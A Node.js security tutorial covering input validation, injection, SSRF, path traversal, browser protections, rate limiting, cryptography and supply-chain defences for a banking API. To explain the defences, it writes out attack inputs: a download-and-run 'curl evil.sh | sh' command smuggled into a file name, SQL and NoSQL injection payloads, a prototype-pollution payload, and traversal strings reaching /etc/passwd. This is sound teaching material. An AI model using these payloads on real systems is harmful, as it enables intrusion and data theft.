---
title: Securing Node.js services — input validation, injection, SSRF, browser attacks, abuse, secrets and supply chain
nav: Node.js security
slug: node-security
summary: Securing a Node.js and Express API beyond login, the OWASP Top 10 mapped to Node, trust boundaries and defence in depth, strict input validation with schemas and query string parser pitfalls, SQL and NoSQL operator injection and command injection and log injection, mass assignment and prototype pollution, server-side request forgery with private address checks, path traversal and file uploads, XSS and Content Security Policy and helmet and CORS and CSRF, denial of service with body limits and timeouts and rate limiting and ReDoS, cryptography with randomBytes and timingSafeEqual and AES-256-GCM, protecting sensitive data and redacting logs and safe errors, supply chain risks with lockfiles and audit and install scripts, runtime hardening and the permission model, security testing with SAST and DAST and secret scanning, compared with Spring Security and the JVM, with banking examples and interview questions.
tags: [Node.js, Security, OWASP, Injection, SSRF, XSS, CORS, Validation, Supply chain, Backend, Full stack]
order: 76
topic: Full stack / Node.js
updated: 2026-11-26
subnav: true
---

Security questions in a Node.js interview are about habits more than tools. Expect questions like these:

- How do you validate input, and why does a schema beat scattered checks?
- What do SQL injection and NoSQL operator injection look like, and how do you prevent them?
- What are mass assignment and prototype pollution?
- How does SSRF work, and how do you stop it?
- How do you keep out path traversal and command injection?
- How do helmet, CSP, CORS and CSRF protection fit together?
- How do you limit abuse and denial of service?
- How do you encrypt and compare secrets correctly?
- What do you never log?
- How do you handle dependencies you did not write?

Login, sessions and tokens are in [Node.js authentication](lesson:node-authentication#basics). This lesson covers everything around them. It builds on [authorisation layers](lesson:node-express-middleware#auth), [JWT](lesson:jwt#validation), [cryptography](lesson:cryptography#practice) and the [full-stack security checklist](lesson:fullstack-integration#security). The examples use a banking transfer service. Play the four scenes: never trust input, server-side requests and files, protect the browser, and defence in depth.

```demo
name: node-security-walk
```

> **One sentence to remember:** *Treat every byte from outside as hostile until a strict schema has checked it.*

Keep data and code apart, with parameters, argument arrays and encoding. Authorise every object. Limit what any caller can cost you. Keep secrets and sensitive data out of code and logs. Assume dependencies and mistakes will fail you, so layer your defences and watch for trouble.

## Thinking about security {#mindset}

A secure design starts with **where trust changes**. A **trust boundary** is any place where data or control crosses from something you do not control into something you do. Examples: a browser, a mobile app, another company's webhook, a file upload. Even another internal service counts, because it can be compromised too.

Every boundary needs three checks:

- **validation**: is the data well formed?
- **authentication**: who is sending it?
- **authorisation**: may they do this, to this object?

Principles that answer most interview questions:

- **Defence in depth.** Use several independent layers: validation, parameterised queries, a least-privilege database user, network policies, monitoring. Then one mistake is not a breach.
- **Least privilege.** The process, the database user and the cloud role get only what they need.
- **Fail closed, and fail safely.** On an error, deny access, and do not leak details.
- **Secure defaults and simplicity.** The safe option is the default. Less code and fewer dependencies mean fewer bugs.
- **Never trust the client.** Hiding a button is not authorisation. The server decides.
- **Complete mediation.** Check every request, not only the first one.

The **OWASP Top 10** is the common checklist. The 2021 edition is widely cited, so check the current version. Here it is mapped to a Node API:

| OWASP category | In Node terms | Where |
| --- | --- | --- |
| **Broken access control** | missing ownership check (IDOR), role checks in the client only | [authorisation](lesson:node-express-middleware#auth), [below](#data) |
| **Cryptographic failures** | `Math.random` for tokens, weak hashes, secrets in code, no TLS | [crypto](#crypto) |
| **Injection** | SQL, NoSQL operators, OS commands, template and log injection, XSS | [injection](#injection), [browser](#browser) |
| **Insecure design** | no limits on transfers, no step-up, no abuse cases | [mindset](#mindset), [abuse](#abuse) |
| **Security misconfiguration** | debug mode, stack traces, default CORS `*`, open ports | [browser](#browser), [runtime](#runtime) |
| **Vulnerable and outdated components** | old packages, typosquats, install scripts | [supply chain](#supply) |
| **Identification and authentication failures** | weak passwords, no MFA, long-lived tokens | [authentication](lesson:node-authentication#login) |
| **Software and data integrity failures** | unsigned images, untrusted deserialisation, CI compromise | [supply chain](#supply) |
| **Logging and monitoring failures** | no audit log, secrets in logs | [data](#data) |
| **Server-side request forgery** | fetching user URLs from inside the network | [SSRF](#ssrf) |

**Threat modelling** finds problems before you write code. Draw the data flow, and mark the trust boundaries. For each flow, ask the **STRIDE** questions: spoofing, tampering, repudiation, information disclosure, denial of service, and elevation of privilege. It is cheap, and it finds design flaws that no scanner can.

## Validate input at the edge {#input}

Everything in `req.body`, `req.query`, `req.params`, `req.headers`, cookies, uploaded files and queue messages is untrusted. The rules:

1. **Validate once, at the edge**, with a **schema** (zod, ajv, valibot, TypeBox), before the data reaches business code. `if` checks scattered through handlers get forgotten.
2. **Allow-list; do not deny-list.** Define what is valid (type, length, format, range, allowed values), instead of trying to list what is bad.
3. **Be strict.** A wrong type is a 400 or 422. Unknown keys are rejected. Numbers have bounds, and strings have maximum lengths.
4. **Build a new object** from the validated result. Never pass `req.body` along.
5. **Validate on the server, even if the browser validates too.** Client-side validation is only for usability.
6. **Normalise** where it matters: Unicode normalisation, trimming, lower case for emails. Strip control characters from text that will be logged or shown.
7. **Check types as well as shapes.** A query string value can arrive as an array or an object. With the `qs` parser that Express 4 uses, `?id[]=1&id[]=2` becomes an array, and `?id[$ne]=x` becomes `{ $ne: 'x' }`. Express 5 uses a simpler parser by default, but the schema must still insist on a string.

Here is a strict validator for a transfer request. It is written without a library, so the checks are visible. zod or ajv express the same thing as a schema.

```javascript
export class ValidationError extends Error {
  constructor(issues) {
    super('Validation failed');
    this.name = 'ValidationError';
    this.status = 422;
    this.issues = issues;
  }
}

export function parseTransfer(input) {
  const issues = [];
  if (input === null || typeof input !== 'object' || Array.isArray(input)) {
    throw new ValidationError([{ path: '', message: 'body must be an object' }]);
  }

  const allowed = new Set(['from', 'to', 'amount', 'currency', 'reference']);
  for (const key of Object.keys(input)) {
    if (!allowed.has(key)) issues.push({ path: key, message: 'unknown field' });      // blocks mass assignment
  }

  const id = (name) => {
    const v = input[name];
    if (typeof v !== 'string' || !/^[A-Z0-9]{8,12}$/.test(v)) issues.push({ path: name, message: 'must be an account id' });
    return v;
  };
  const from = id('from');
  const to = id('to');
  if (from !== undefined && from === to) issues.push({ path: 'to', message: 'must differ from from' });

  const amount = input.amount;
  if (!Number.isInteger(amount) || amount <= 0 || amount > 10_000_000) {              // integer cents, with an upper bound
    issues.push({ path: 'amount', message: 'must be a positive integer number of cents, at most 10000000' });
  }
  if (!['SGD', 'USD', 'EUR'].includes(input.currency)) issues.push({ path: 'currency', message: 'unsupported currency' });

  let reference = input.reference;
  if (reference !== undefined) {
    if (typeof reference !== 'string' || reference.length > 140) {
      issues.push({ path: 'reference', message: 'must be text up to 140 characters' });
    } else {
      reference = reference.normalize('NFC').replace(/[\u0000-\u001f\u007f]/g, ' ').trim();   // strip control characters
    }
  }

  if (issues.length) throw new ValidationError(issues);
  return { from, to, amount, currency: input.currency, ...(reference ? { reference } : {}) };   // a new object
}
```

I ran this with `node:test`. A good request produces a clean object. These are all rejected, with every issue reported together:

- `role: 'admin'`;
- a string amount, and a negative amount;
- `from: { $ne: null }`;
- an array body;
- a JSON body with `__proto__`.

Return validation errors in a **consistent format**: a 422 with a list of issues. Do **not** echo hostile input back into the message unescaped.

Also limit the size of everything: `express.json({ limit: '100kb' })`, the number of items in arrays, the page size, and the upload size ([abuse](#abuse)).

## Injection {#injection}

**Injection** happens when another system reads untrusted data as code or as a command. The cure is always the same: **keep data and code apart**, so data can never become code.

### SQL injection

```javascript
// vulnerable: the value becomes part of the SQL text
const { rows } = await pool.query(`SELECT * FROM accounts WHERE owner = '${req.query.owner}'`);
// ?owner=' OR '1'='1   returns every account

// safe: SQL and values travel separately, the driver never mixes them
const { rows } = await pool.query('SELECT * FROM accounts WHERE owner = $1', [req.query.owner]);
```

- **Always use parameters** (`$1`, `?`, named parameters). That includes ORMs and query builders: their `raw` or `sql` escape hatches need the same care.
- Some things **cannot be parameters**: table and column names, the `ORDER BY` direction, and sometimes `LIMIT`. **Allow-list** them: `const column = { date: 'created_at', amount: 'amount' }[req.query.sort] ?? 'created_at'`.
- For `LIKE` patterns, escape the `%` and `_` characters in user text.
- Connect as a **least-privilege database user**. Then any injection that slips through cannot drop tables or read other schemas. Never connect as the owner or a superuser.
- Escaping functions are a last resort. Parameters are the real control.

### NoSQL operator injection

A MongoDB-style query is JSON. So a **JSON body can inject operators**:

```javascript
// POST /login  { "email": "alice@bank.example", "password": { "$ne": null } }
const user = await users.findOne({ email: req.body.email, password: req.body.password });
// the password condition becomes "not null": always true, so the login succeeds
```

The cure:

- validate that `email` and `password` are **strings**, which a schema does;
- never pass request objects into queries;
- hash passwords, instead of comparing them in the query;
- consider removing keys that start with `$`, for example with `express-mongo-sanitize`.

The same type confusion applies to any query built from `req.body`.

### OS command injection

```javascript
import { exec, execFile } from 'node:child_process';

exec(`convert ${req.query.file} out.png`);                       // a shell parses the string: "a.png; curl evil.sh | sh" runs
execFile('convert', [file, 'out.png']);                          // no shell: the text stays one argument
```

I ran both with the input `hello && echo INJECTED`. `exec` printed `INJECTED`, because the shell ran the second command. `execFile` printed the text unchanged, as one argument.

Rules:

- Prefer a **library** to starting a program.
- Use `execFile` or `spawn` with an **argument array**, and `shell: false`, which is the default.
- Validate the argument against an allow-list. Reject values starting with `-`, which a program would read as an option, or put `--` before them.
- Run with minimal privileges.
- Never use `eval`, `new Function`, `vm` (it is **not** a security sandbox), or a template engine on template text the user controls.

### Other injection forms

- **Log injection.** User text with newlines can forge log lines, such as `\n2026-11-20 INFO admin logged in`. Log **structured JSON** (pino), with the user text as a field, so it is escaped. Strip control characters.
- **Header injection** (CRLF). Never put raw user text into a header value or a redirect URL. Node rejects invalid characters in header values, but validate anyway.
- **Template injection.** Do not build templates from user input. Let the engine escape variables by default.
- **LDAP, XPath, GraphQL and email injection.** The same idea, with parameters or encoding suited to each target. For GraphQL, also limit **query depth and cost**.
- **Open redirect.** `res.redirect(req.query.next)` can send users from your domain to a phishing site. Allow-list the targets, or accept only relative paths.

## Mass assignment and prototype pollution {#objects}

**Mass assignment** copies a whole request body into a model or an update. A caller can then set fields you never meant to expose:

```javascript
await db.accounts.update(id, { ...req.body });        // body: { "nickname": "x", "role": "admin", "limit": 99999999 }
```

Reject unknown keys, and **pick the allowed fields** explicitly (see the validator above). Keep separate input types for create and update. Never accept server-controlled fields, such as `id`, `owner`, `role` and `balance`, from the client.

TypeScript types do **not** protect you here, because they are erased at runtime. Validate at runtime.

**Prototype pollution** abuses the fact that JavaScript objects inherit from `Object.prototype`. A recursive merge that follows the key `__proto__`, or `constructor.prototype`, writes onto that shared prototype. Then **every** object in the process changes:

```javascript
function unsafeMerge(target, src) {
  for (const k in src) {
    if (typeof src[k] === 'object' && src[k] !== null) { target[k] ??= {}; unsafeMerge(target[k], src[k]); }
    else target[k] = src[k];
  }
  return target;
}
unsafeMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
({}).isAdmin;        // true: every object now has isAdmin
```

`JSON.parse` itself is safe. It creates `__proto__` as an ordinary property of the object. The danger is the **merge, clone or path-set** code that runs afterwards: `lodash.merge`, `set(obj, path, value)` with user paths, or a hand-written deep copy.

My test showed this. After the unsafe merge, `({}).isAdmin` was `true`. After the safe merge below, it stayed `undefined`.

```javascript
const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, src) {
  for (const k of Object.keys(src)) {
    if (FORBIDDEN.has(k)) continue;                                           // never follow these keys
    if (typeof src[k] === 'object' && src[k] !== null && !Array.isArray(src[k])) {
      if (!Object.hasOwn(target, k)) target[k] = {};                          // own properties only
      safeMerge(target[k], src[k]);
    } else target[k] = src[k];
  }
  return target;
}
```

Other defences:

- a `Map`, or `Object.create(null)`, for dictionaries keyed by user text;
- `structuredClone` for copying;
- a schema that rejects unknown keys;
- `Object.freeze(Object.prototype)` in tests;
- up-to-date libraries;
- `node --disable-proto=delete`, which removes `__proto__` altogether.

## Server-side requests: SSRF {#ssrf}

**Server-side request forgery** makes your server send a request the attacker chooses. The usual way in is a feature that fetches a URL: webhook URLs, "import from URL", image fetchers and PDF renderers.

From inside your network, the attacker can reach services the internet cannot: admin consoles, databases, and above all the **cloud metadata service** (`http://169.254.169.254/...`). That service can hand out the credentials of the machine's role.

Defences, strongest first:

1. **Do not fetch user URLs.** If you must, accept only **allow-listed hosts** (`api.partner.example`).
2. Allow only `https:` (and `http:` if needed). Allow no credentials in the URL, and no unusual ports.
3. **Resolve the name, and reject private addresses**:
   - loopback: `127.0.0.0/8`, `::1`;
   - private ranges: `10/8`, `172.16/12`, `192.168/16`;
   - link-local: `169.254/16`, `fe80::/10`;
   - unique local IPv6: `fc00::/7`;
   - carrier-grade NAT, and IPv4 addresses mapped into IPv6.
4. **Do not follow redirects automatically.** Use `redirect: 'error'`, or check each hop, because a public URL can redirect to an internal one.
5. Set **timeouts and a maximum response size**. Do not return the fetched body to the caller as it is.
6. **Network controls.** Add egress rules, so the service cannot reach the metadata endpoint or internal ranges anyway. On AWS, require **IMDSv2**, which needs a session token header that a simple SSRF cannot add.

```javascript
import { lookup } from 'node:dns/promises';
import net from 'node:net';

export function isPrivateAddress(ip) {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split('.').map(Number);
    return a === 10 || a === 127 || a === 0
      || (a === 172 && b >= 16 && b <= 31)
      || (a === 192 && b === 168)
      || (a === 169 && b === 254)                                 // cloud metadata service
      || (a === 100 && b >= 64 && b <= 127);                      // carrier-grade NAT
  }
  if (net.isIPv6(ip)) {
    const v = ip.toLowerCase();
    if (v.startsWith('::ffff:')) return isPrivateAddress(v.slice(7));         // IPv4-mapped address
    return v === '::1' || v === '::' || v.startsWith('fc') || v.startsWith('fd')
      || v.startsWith('fe8') || v.startsWith('fe9') || v.startsWith('fea') || v.startsWith('feb');
  }
  return true;                                                                 // not an IP address: refuse
}

export async function assertPublicHttpUrl(raw, { allowedHosts } = {}) {
  const url = new URL(raw);
  if (!['https:', 'http:'].includes(url.protocol)) throw new Error('only http and https');
  if (url.username || url.password) throw new Error('credentials in the URL are not allowed');
  if (allowedHosts && !allowedHosts.includes(url.hostname)) throw new Error('host not allowed');

  const addresses = await lookup(url.hostname, { all: true });                 // every address the name resolves to
  if (addresses.length === 0 || addresses.some((a) => isPrivateAddress(a.address))) throw new Error('address not allowed');
  return url;
}

const url = await assertPublicHttpUrl(req.body.callbackUrl, { allowedHosts: partnerHosts });
const res = await fetch(url, { redirect: 'error', signal: AbortSignal.timeout(3000) });
```

I tested this. These are all rejected: `localhost`, `169.254.169.254`, `10.x`, `fd00::1`, `::ffff:127.0.0.1`, `file:///etc/passwd`, a URL with credentials, and a host outside the allow-list. A public address passes.

One subtle gap remains: **DNS rebinding**. The name can resolve to a public address during the check, and to a private one when `fetch` resolves it again. The strongest fix is to **connect to the address you checked**: give the HTTP agent a custom `lookup` function that performs the check. Or rely on egress network rules.

## Files, paths and uploads {#files}

**Path traversal**: a file name such as `../../etc/passwd` climbs out of the folder you meant to serve. Never open `path.join(baseDir, userInput)` without checking the result:

```javascript
import path from 'node:path';

export function safeJoin(baseDir, userPath) {
  if (typeof userPath !== 'string' || userPath.includes('\0')) throw new Error('invalid path');
  const base = path.resolve(baseDir);
  const target = path.resolve(base, userPath);                // resolves .. and absolute paths
  const rel = path.relative(base, target);
  if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) throw new Error('path escapes the base directory');
  return target;
}
```

I tested this. These all throw: `../secret.txt`, `..\..\x`, `../../etc/passwd`, `a/../../b`, an absolute path, an empty path, and a path with a null byte. `2026/11/a.pdf` is accepted.

Better still:

- **Do not use user text as a path at all.** Store files under generated ids, such as a UUID, and look the name up in the database.
- If symbolic links are possible, also check the `fs.realpath` of the result.
- Use `express.static` for static content, instead of writing your own. It handles traversal, and ignores dotfiles by default.
- **Zip slip** is the same problem inside archives. Check every entry name before extracting.

**Uploads**, such as statements and ID documents, need their own rules:

- Set a **maximum size** and number of files (multer `limits`, or a streaming parser), and a request timeout.
- Check the **content**, not the file name or the `Content-Type` header. Look at the magic bytes, allow only the types you expect, and re-encode images.
- Store files **outside the web root**, under a **random name**. Use private object storage (S3), with short-lived signed URLs for downloads. Serve them with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
- **Scan** for malware where the risk justifies it. Never run or `require` uploaded content.

## Protecting the browser: XSS, CSP, CORS and CSRF {#browser}

Most of these are front-end issues. But the API sets the headers and the cookies, so a Node developer must know them.

**Cross-site scripting (XSS)**: attacker text runs as script in a victim's browser. It can then read pages and act as the user.

- **Encode output** for its context: HTML, attribute, URL, JavaScript or CSS. React escapes text by default. The dangers are `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, HTML strings built on the server, and JSON put inside a `<script>` tag without escaping `<`.
- **Sanitise rich text** you must allow, with a maintained library (DOMPurify, `sanitize-html`) on a strict allow-list. Never write your own regular expression sanitiser.
- A strict **Content Security Policy** limits what an injected script can do (see below).
- Keep tokens out of JavaScript's reach, with `HttpOnly` cookies ([authentication](lesson:node-authentication#sessions)).

**helmet** sets a sensible group of headers in one call:

```javascript
import helmet from 'helmet';

app.disable('x-powered-by');                      // do not advertise the framework
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],                       // no inline scripts, no third-party scripts unless listed
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],                  // nobody may frame the app (clickjacking)
      baseUri: ["'self'"],
    },
  },
  hsts: { maxAge: 31_536_000, includeSubDomains: true },   // browsers use HTTPS only
}));
```

helmet also sets `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy`.

For a JSON API, a tight `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` is enough. The real CSP matters on the server that serves the HTML, such as the front end's host or CDN. Roll out a new CSP in `Content-Security-Policy-Report-Only` mode first.

**CORS** tells browsers which other origins may read your API's responses. It is **not** authentication. It does not stop a request from being sent; it only stops the response being read ([CORS in Express](lesson:node-express-middleware#common)). Rules:

- Use an **allow-list of exact origins**. Never reflect the `Origin` header blindly. Never combine `Access-Control-Allow-Origin: *` with credentials. Browsers refuse that, and reflecting any origin with credentials is a vulnerability.
- Match origins **exactly**. `origin.endsWith('bank.example')` also matches `evilbank.example`, and a loose regular expression has the same flaw.
- Treat the `null` origin, from sandboxed iframes and `file:` pages, as untrusted.
- Allow only the methods and headers you need. Keep `Access-Control-Max-Age` modest.

**CSRF** (cross-site request forgery): with cookie authentication, the browser attaches the cookie to a request from any site. So a hostile page can submit a form to your transfer endpoint. Defences:

- `SameSite=Lax` or `Strict` cookies;
- an **anti-CSRF token**, or a custom request header. A cross-site form cannot add one without a CORS preflight, which you refuse;
- checking `Origin` and `Sec-Fetch-Site` on requests that change state;
- never changing state with `GET`.

Bearer tokens in an `Authorization` header are not sent automatically, so they are not open to CSRF. But they must be stored carefully ([session or token](lesson:node-authentication#attacks)).

## Abuse and denial of service {#abuse}

Some requests are hostile, and others are just expensive. The goal: **no single caller can cost more than their share**.

| Risk | Control |
| --- | --- |
| huge bodies and uploads | `express.json({ limit })`, upload limits, reject early with 413 |
| slow connections (slowloris) | server timeouts: `headersTimeout`, `requestTimeout`, `keepAliveTimeout`, `maxHeadersCount`, plus the proxy's limits |
| too many requests | **rate limiting** per user, per API key and per address (and stricter on login, reset and OTP endpoints) |
| expensive queries | maximum page size, bounded filters, query timeouts (`statement_timeout`), GraphQL depth and cost limits |
| event loop blocking | no sync work in handlers, **ReDoS**-safe patterns, worker threads ([performance](lesson:node-performance#loop)) |
| decompression and parsing bombs | limit the decompressed size, depth and number of keys |
| hashing as a weapon | limit login attempts, run password hashing off the main thread |
| resource exhaustion | connection and concurrency limits, timeouts on every outbound call, load shedding ([shedding](lesson:node-performance#shedding)) |

Here is a rate limiter with a shared store, so every instance sees the same counters:

```javascript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

app.set('trust proxy', 1);                                   // so the real client address is used, not the proxy's

const apiLimiter = rateLimit({
  windowMs: 60_000, limit: 120,                              // 120 requests per minute
  standardHeaders: 'draft-7', legacyHeaders: false,
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
  keyGenerator: (req) => req.user?.id ?? req.ip,             // per user once authenticated, per address before
});
const loginLimiter = rateLimit({ windowMs: 15 * 60_000, limit: 10, store, keyGenerator: (req) => `${req.ip}:${req.body?.email}` });

app.use('/api', apiLimiter);
app.post('/login', loginLimiter, loginHandler);
```

An in-memory limiter only works for a single process. When you run several pods, use Redis, or the gateway's limiter. Respond with `429` and `Retry-After`.

**ReDoS** (regular expression denial of service): a pattern with nested quantifiers backtracks exponentially on crafted input. I measured `/^(a+)+$/` against `'a'` repeated n times, followed by `b`:

- 54 ms at n = 20;
- 601 ms at n = 26;
- about **3 seconds at n = 28**. All that time, the process serves nobody.

The linear pattern `/^a+$/` took 2 ms on a million characters.

So:

- avoid nested or overlapping quantifiers;
- limit the input length before matching;
- prefer parsers to regular expressions for structured data;
- use a linear-time engine such as `re2` for patterns that users supply.

## Cryptography and secrets in code {#crypto}

Most mistakes come from **using the right primitive wrongly**. Use `node:crypto` and well-known libraries, never your own scheme ([cryptography in practice](lesson:cryptography#practice)).

- **Randomness for secrets.** Use `crypto.randomBytes`, `crypto.randomUUID` or `crypto.randomInt`. **Never `Math.random()`** for tokens, ids that must not be guessable, reset codes or session ids.
- **Compare secrets in constant time.** Use `crypto.timingSafeEqual` on buffers of equal length; check the length first. Then the response time does not reveal how many characters matched (see the helper in [authentication](lesson:node-authentication#login)).
- **Passwords**: argon2id, scrypt or bcrypt, never a fast hash ([passwords](lesson:node-authentication#passwords)).
- **Data integrity and webhook signatures**: HMAC-SHA-256 with a secret, compared in constant time, plus a timestamp to stop replays.
- **Encrypting data.** Use an **authenticated** mode, **AES-256-GCM**. Use a fresh random 12-byte IV (initialisation vector) for every message, and check the tag on decryption. Never use ECB, a reused IV, encryption without authentication, or a home-made algorithm.
- **Keys.** Generate them with `randomBytes(32)`. Store them in a KMS or secret manager, never in the code. Rotate them. For bulk data, use **envelope encryption**: a data key, which is itself encrypted by a master key in the KMS.
- **TLS.** Use a current protocol version. Never set `rejectUnauthorized: false` or `NODE_TLS_REJECT_UNAUTHORIZED=0` to silence a certificate error. That turns off the check, and allows a man-in-the-middle attack.

```javascript
import { createCipheriv, createDecipheriv, randomBytes } from 'node:crypto';

export function encrypt(plaintext, key, aad = '') {
  if (key.length !== 32) throw new Error('key must be 32 bytes');
  const iv = randomBytes(12);                                         // unique for every message under one key
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  if (aad) cipher.setAAD(Buffer.from(aad));                           // bound to the message but not encrypted, e.g. the account id
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  return Buffer.concat([iv, cipher.getAuthTag(), ciphertext]).toString('base64url');   // iv | tag (16 bytes) | ciphertext
}

export function decrypt(token, key, aad = '') {
  const raw = Buffer.from(token, 'base64url');
  if (raw.length < 28) throw new Error('invalid token');
  const decipher = createDecipheriv('aes-256-gcm', key, raw.subarray(0, 12));
  decipher.setAuthTag(raw.subarray(12, 28));
  if (aad) decipher.setAAD(Buffer.from(aad));
  return Buffer.concat([decipher.update(raw.subarray(28)), decipher.final()]).toString('utf8');   // final() throws if anything changed
}
```

I tested this. A round trip returns the original text. Two encryptions of the same text differ, because of the fresh IV. Decryption throws for a wrong key, a wrong associated-data value, and a single flipped bit. In production, the key comes from a KMS, and bulk data uses a data key the KMS has encrypted.

**Handling secrets.** Keep secrets out of Git, images, build arguments, URLs, client bundles (`VITE_*` variables are public), and logs. Run **secret scanning** (gitleaks, GitHub secret scanning) in the pipeline and as a pre-commit hook. **Rotate** anything that leaked. Removing it from history does not make it secret again ([configuration and secrets](lesson:node-deployment#config)).

## Sensitive data, logging and errors {#data}

- **Classify data.** Card numbers (PAN), national ID numbers, account numbers and personal data need extra care. Personal data is covered by Singapore's PDPA and similar laws. A bank also follows PCI DSS for cards, and its regulator's technology risk guidelines. Do not collect or keep what you do not need. Do **not store** the card verification value at all.
- **Encrypt** sensitive fields at rest: database and disk encryption, plus field-level AES-GCM for the most sensitive. Use TLS everywhere in transit, inside the network too.
- **Mask and redact.** Show only the last four digits. Keep sensitive fields out of logs, error reports, analytics and URLs, because query strings end up in access logs. With pino, `redact` removes paths from log lines.

```javascript
import pino from 'pino';

export const logger = pino({
  redact: { paths: ['req.headers.authorization', 'req.headers.cookie', '*.password', '*.cardNumber', '*.token'], censor: '[redacted]' },
});

// a defensive mask for free text that might contain a card number
export const maskPan = (s) => String(s).replace(/\b(\d{4})[ -]?(\d{4,8})[ -]?(\d{4})[ -]?(\d{0,4})\b/g, (m) => m.replace(/\d(?=(?:[ -]?\d){4})/g, '*'));
maskPan('card 4111 1111 1111 1111 ok');      // 'card **** **** **** 1111 ok'
```

- **Errors.** Return a generic message and a **correlation id** to the client. Keep the details and the stack trace in the logs. In production, never send `err.stack`, SQL text, file paths or library versions. Set `NODE_ENV=production`, and use a central error handler (see [error handling](lesson:node-express-middleware#errors)). When even the existence of a record is secret, return the same response for "not found" and "not yours".
- **Authorisation on every object.** This failure is called broken object-level authorisation, or **IDOR**. `GET /accounts/:id` must check that the caller owns or may see **that** account, not only that they are logged in. Put the check in the service, next to the data access. Add a test that user B gets 403 or 404 for user A's account. Predictable ids (1, 2, 3) make guessing easy, but changing the ids is not the fix.
- **Least-privilege data access.** Use separate database users for the application, migrations and reporting. Add row-level security where it fits. Never share admin credentials.
- **Audit log.** Record sign-ins, authorisation failures, changes to payees and limits, and every money movement: who, what, when, from where, and the outcome. Keep it in an append-only store, without secrets. See [observability](lesson:fullstack-integration#observability).
- **Retention.** Delete data you no longer need. Encrypt backups, and control who can access them.

## The supply chain {#supply}

A typical Node service contains hundreds of indirect packages. Many real breaches happen there:

- **typosquatting**: a look-alike name, such as `expresss`;
- a **hijacked maintainer account**, or a malicious update;
- **dependency confusion**: someone takes the name of your private package on the public registry;
- **install scripts** that run code during `install`.

Defences:

- **Commit the lockfile, and install it frozen** (`pnpm install --frozen-lockfile`). The build then uses exactly the reviewed versions.
- **Audit.** Run `pnpm audit --prod` in CI, alert on new advisories, and take **automated update pull requests** (Renovate, Dependabot) through review and tests. Recent pnpm versions do not run dependency install scripts unless you allow-list them, which blocks a whole class of attacks. With other tools, use `--ignore-scripts`, and enable scripts only where needed.
- **Choose dependencies carefully**: maintained, widely used and small. Replace a trivial package with a few lines of your own. Check new packages by name, publisher and download history.
- **A private registry or proxy**, with an allow-list. Register your scoped package names (`@bank/...`) on the public registry, to prevent confusion.
- **Provenance and signing.** Use npm provenance for packages you publish, signed container images, and **SBOM** generation. Pin GitHub Actions to a commit SHA, because a CI action runs with your secrets.
- **Protect the pipeline.** Use least-privilege CI tokens, and no long-lived cloud keys (use OIDC federation instead). Protect branches, require reviews, and separate build and deploy permissions.
- **Know where each package runs.** A vulnerability in a dev dependency only is far less urgent than one in a production request path. Have a process to update fast when a critical advisory appears.

## Runtime hardening {#runtime}

- **Container and process**: a non-root user, a read-only filesystem, no extra capabilities, and a minimal image ([Docker image security](lesson:docker#security), [deployment](lesson:node-deployment#docker)).
- **Set `NODE_ENV=production`.** Expose no debug endpoints, and never expose `--inspect`: the inspector allows remote code execution. Keep `/metrics` and `/health` details off the public ingress.
- **Node's permission model**, in recent versions (`node --permission --allow-fs-read=/app`), restricts a process's access to the file system, child processes and workers. It is a useful extra layer, but it does not replace the controls above.
- **Network**: Kubernetes NetworkPolicies that deny by default, egress restrictions, private subnets for databases, TLS between services, and a WAF in front of public APIs.
- **Process errors**: on `uncaughtException` and `unhandledRejection`, log and exit, and let the orchestrator restart. Do not keep running in an unknown state.
- **Do not trust `vm`, `eval`, `Function`, or `require` of paths the user influences.** Be careful with `JSON` reviver functions, with `yaml` loaders that allow custom types, and with deserialisers that can create arbitrary classes. That is the same class of problem as Java deserialisation.
- **Keep Node and the OS patched.** Run a supported LTS version, and rebuild images regularly.

## Security testing and process {#testing}

| Technique | Finds | Example tools |
| --- | --- | --- |
| **SAST** (static analysis) | injection patterns, unsafe APIs, hard-coded secrets | CodeQL, Semgrep, `eslint-plugin-security` |
| **dependency scanning** | known vulnerable packages | `pnpm audit`, Dependabot, Snyk, OSV |
| **secret scanning** | leaked keys and tokens | gitleaks, GitHub secret scanning |
| **container scanning** | vulnerable OS packages in the image | Trivy, Grype |
| **DAST** (running app) | missing headers, injection, misconfiguration | OWASP ZAP |
| **unit and integration tests for security rules** | IDOR, validation, rate limits, error format | `node:test`, supertest ([testing](lesson:node-testing#http)) |
| **fuzzing and property tests** | crashes and edge cases in parsers | fast-check |
| **penetration test** and **bug bounty** | logic flaws and chained issues | external testers |
| **threat modelling and design review** | design flaws | STRIDE sessions |

Write **abuse-case tests** next to the happy path:

- user B cannot read user A's account (403 or 404);
- a body with `role: 'admin'` is rejected;
- a path with `..` is rejected;
- the 121st request in a minute gets 429;
- an expired or tampered token fails.

Make security checks **pipeline gates**, and agree how quickly critical findings must be fixed. Keep a short **incident response plan**: contain, rotate secrets, investigate with the audit log, notify (regulators and customers where required), and learn.

## Common mistakes {#mistakes}

| Mistake | Fix |
| --- | --- |
| trusting `req.body`, `req.query` and headers | a strict schema at the edge, build a new object |
| SQL built with template strings | parameters, allow-listed identifiers |
| passing `req.body` into a Mongo query | validate types, reject operator objects |
| `exec` with user text | `execFile` with an argument array, or a library |
| `{ ...req.body }` into an update | pick allowed fields, reject unknown keys |
| deep merge of untrusted JSON | skip `__proto__` and `constructor`, use `Map`, `hasOwn` |
| fetching user-supplied URLs freely | allow-list, private address check, no redirects, egress rules |
| `path.join(base, userInput)` | `path.resolve` and `path.relative` check, or generated ids |
| trusting file name and content type of uploads | magic bytes, random names, private storage |
| `dangerouslySetInnerHTML` or `innerHTML` with user text | encode, sanitise with DOMPurify |
| `Access-Control-Allow-Origin: *` with credentials, or reflecting the origin | exact allow-list |
